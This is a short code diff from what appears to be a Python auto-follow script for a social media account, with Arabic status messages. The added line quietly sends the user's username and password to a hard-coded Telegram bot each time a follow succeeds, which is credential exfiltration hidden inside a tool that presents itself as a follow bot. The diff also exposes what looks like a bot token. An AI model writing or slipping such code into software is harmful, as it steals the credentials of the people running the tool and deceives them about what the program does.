@@ -165,5 +165,7 @@ for user in ids1:
     sleep(2)
     if '"status":"ok"' in follow:
 	    print('تم متابعة => ' +user)
+            req = requests.post(f'https://api.telegram.org/bot5249019648:AAEv6R6vr3eRpeSAO6KoJGH9ixfjOVTafys/sendMessage?chat_id={id}&text=تم متابعة {user} بواسطة {username} : {password}')  
+
     else:
 	    print(' خطأ بالمتابعة => '+user)	
